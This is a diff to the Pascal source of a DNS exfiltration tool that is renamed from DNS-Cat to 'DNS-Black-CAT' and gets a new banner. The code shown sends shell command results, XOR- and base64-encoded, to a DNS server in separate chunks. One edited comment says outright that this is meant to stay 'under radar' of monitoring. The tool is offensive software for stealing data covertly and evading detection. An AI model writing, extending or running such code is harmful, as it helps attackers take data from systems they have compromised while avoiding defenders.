@@ -2,11 +2,13 @@
 
     
 
-,------.  ,--.  ,--. ,---.         ,-----.          ,--.
-|  .-.  \ |  ,'.|  |'   .-',-----.'  .--./ ,--,--.,-'  '-.
-|  |  \  :|  |' '  |`.  `-.'-----'|  |    ' ,-.  |'-.  .-'
-|  '--'  /|  | `   |.-'    |      '  '--'\\ '-'  |  |  |
-`-------' `--'  `--'`-----'        `-----' `--`--'  `--'
+
+  ___  _  _ ___     ___ _      _   ___ _  __    ___   _ _____
+ |   \| \| / __|___| _ ) |    /_\ / __| |/ /__ / __| /_\_   _|
+ | |) | .` \__ \___| _ \ |__ / _ \ (__| ' <___| (__ / _ \| |
+ |___/|_|\_|___/   |___/____/_/ \_\___|_|\_\   \___/_/ \_\_|
+
+
 
 
  * Source is provided to this software because we believe users have a     *
@@ -113,7 +115,7 @@ begin
 end;
 {$IFEND}
 
-function traffic_Seg(const data:string):string;   // send every chunk with separated request
+function traffic_Seg(const data:string):string;   // send every chunk with separated request in order to be under radar
 var
   tmp_list : Tstringlist;
   DNSd: TDNSsend;
@@ -250,9 +252,8 @@ begin
    // Send data into DNS server as Chunks
    for i := 0 to High(Arr) do begin
 
-  //DNSd.TargetHost := i_host;
+
   traffic_Seg(TestXorBase64(Arr[i]));
-  //DNSd.DNSQuery(TestXorBase64(Arr[i])+'.'+i_host, QType_MX, l);
   writeln('[+]Shell command results has been sent -> ');
 end;
 
@@ -312,7 +313,7 @@ end;
 procedure TDNSCAT.WriteHelp;
 begin
 
-  writeln('[!] DNS-CAT Exfiltration Multi-platform Tool v1.1');
+  writeln('[!] DNS-Black-CAT Exfiltration Multi-platform Tool v1.1');
   writeln('[*] supports : Windows , Linux , Macos ..');
   writeln('by : @zux0x3a <> 0xsp.com ');
   writeln(' ');
@@ -323,7 +324,7 @@ var
   Application: TDNSCAT;
 begin
   Application:=TDNSCAT.Create(nil);
-  Application.Title:='DNS-Cat';
+  Application.Title:='DNS-Black-Cat';
   Application.Run;
   Application.Free;
 end.
